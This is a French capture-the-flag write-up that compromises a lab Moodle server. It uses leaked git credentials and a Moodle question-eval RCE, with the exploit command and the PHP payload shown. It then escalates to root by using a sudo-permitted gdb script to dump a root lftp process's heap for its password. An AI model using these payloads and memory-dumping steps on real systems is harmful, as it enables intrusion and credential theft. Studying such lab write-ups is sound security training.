# Description
On vous appelle à l'aide !
Un étudiant nommé Mel a créé une plateforme qui reprend les idées du célèbre site root-me en faisant payer les cours.
Il a récemment migré sa plateforme qui était sur Wordpress vers Moodle pour vous donner accès à un cours d'exemple pour vous donner envie d'acheter.
Votre but premier est d'obtenir un shell sur la machine avec l'utilisateur de Mel.
Accès au challenge : ici
Mirror : ici
P.S : Une instance docker va être déployée quand vous le demanderez, attendez la création de celui-ci pour obtenir les liens. On vous demande de ne déployer qu'une seule instance par team.
P.S.2 : Des rules iptables sont en places, si votre comportement n'est pas adapté au challenge (scan des ports de la machine hôte), vous serez banni pendant 10 minutes.
(Le serveur en lui même est out of scope, seul le docker déployé le sera)

# Write UP

## Partie 1

Le challenge débute sur un serveur web avec Moodle installé dessus.
Il y a un cours qui ne nous apprend pas grand chose, si ce n'est l'existance [d'un github](https://github.com/melTHEboss/php_exploit) appartenant à l'auteur.

En se rendant dessus, il y a un répo `php_exploit` avec un commit "OOOOOOPS wrong commit".
En regardant le diff, on retrouve un fichier `config.php.bak` qui contient les identifiants Moodle ainsi que les infos de la bdd.
On peut donc maintenant se connecter en tant que `meltheboss` sur le Moodle.

Après quelques rapides recherches, on se rend compte qu'il existe un exploit RCE pour cette version spécifique de moodle ([https://www.exploit-db.com/exploits/46551](https://www.exploit-db.com/exploits/46551)).

La faille réside dans la fonction "question dynamique" qui peut être exploitée jusqu'à un `eval()` de code.

`php 46551.php url=http://217.160.15.230:36471 user=meltheboss pass=[Je l'ai plus] ip=x.x.x.x port=4242 course=2`

Toute les étapes se passent bien, jusqu'à la dernière `[*] Adding Evil Question` qui ne fonctionne pas.
À ce moment là, deux possibilités : on corrige l'exploit ou on termine à la main.

On va donc terminer l'exploitation à la mano à l'aide de [cet article de blog](https://blog.ripstech.com/2018/moodle-remote-code-execution).
 Il nous suffit d'utiliser les éléments déjà créés par notre exploit, et
 d'y ajouter manuellement la fameuse question piégée avec le payload `/*{a*/`$_GET[0]`;//{x}}`.

On est maintenant en mesure d'exécuter du code par le paramètre GET 
0. On en profite pour se créer un reverse shell, et nous voila connecté 
en tant qu'utilisatuer `www-data`.

On doit maintenant réussir à se connecter en tant que `meltheboss`.
Nos droits étant limités, on compte sur une réutilisation de mot de passe.

On dispose toujours des identifiants mysql récupérés sur le git. C'est le moment de voir si on peut en tirer quelque chose.
Et en effet, il y a une base mysql "wordpress" avec une table "wp_users" dans laquelle se trouve un utilisateur `meltheboss` ainsi que son mot de passe en base64 (`P4ssw0rd0fm3l!!`).

Le flag se trouve dans `/home/meltheboss/flag.txt`.

## Partie 2

On profite d'avoir le pass de meltheboss pour s'ouvrir un petit SSH bien confort.
Premier reflex de reconaissance : `sudo -l`

On découvre alors qu'on a les droits sudo pour un fichier `/usr/local/bin/gdb_fork.py`.
Quand on lance ce fichier, un prompt nous demande d'indiquer un fichier à exécuter.

On pourrait imaginer qu'il s'agit donc d'un script qui ferait un eval() sur un autre fichier python.
On se crée donc un fichier de test dans `/tmp` :

`echo 'print(1)' > /tmp/test.py`

Lorsqu'on essaye de l'importer, le programme nous répond que le fichier doit respecter la syntaxe :

```python
import gdb
gdb.execute('attach x')
gdb.execute('i a r')
gdb.execute('quit')

```

Il semblerait donc qu'on soit conffronté à une librairie pyton qui execute des commandes dans GDB.
Ma première idée était de voir si on pouvait se spawn un petit shell :

```python
gdb.execute('!sh')
gdb.execute('!bash')
gdb.execute('shell')
gdb.execute('python import pty; pty.spawn("/bin/sh")')
gdb.execute('python')
gdb.execute('python-interactive')
```

Mais sans succès. Mon attention a donc été attirée par la première ligne du script d'exemple qui parle d'attacher un processus (`attach x`).
 Comme rien n'est jamais là par hasard, on fait un petit tour dans les 
processus et on découvre en effet un lftp qui tourne avec les droits 
root et le pid `562`.

Nouvelle idée : attacher ce processus et essayer de voir si on peut pas retrouver un mot de passe dans la mémoire.

On se construit donc un nouvel exploit :

```python
import gdb
gdb.execute('attach 562')
gdb.execute('info proc mappings')
```

qui fonctionne à merveille et nous donne nos adresses mémoire :

```
Mapped address spaces:

Start Addr           End Addr       Size         Offset objfile
0x55e8db79a000     0x55e8db8e9000   0x14f000        0x0 /usr/bin/lftp
0x55e8dbae9000     0x55e8dbaf2000     0x9000   0x14f000 /usr/bin/lftp
0x55e8dbaf2000     0x55e8dbaf8000     0x6000   0x158000 /usr/bin/lftp
0x55e8dbaf8000     0x55e8dbafa000     0x2000        0x0

0x55e8dd0c5000     0x55e8dd144000    0x7f000        0x0 [heap]
```

On peut maintenant exporter le contenu de notre heap :

```python
import gdb
gdb.execute('attach 562')
gdb.execute('dump memory out 0x55e8dd0c5000 0x55e8dd144000')
```

La commande `strings` n'est pas installée sur le serveur, on fait donc un scp pour récupérer le fichier `out` en local et après un petit parcours manuel on retrouve notre mot de passe : `th3sup3rr00tp4ssw0rd`.

Le flag se trouve dans `/root/flag.txt`.

# Flag 
- 
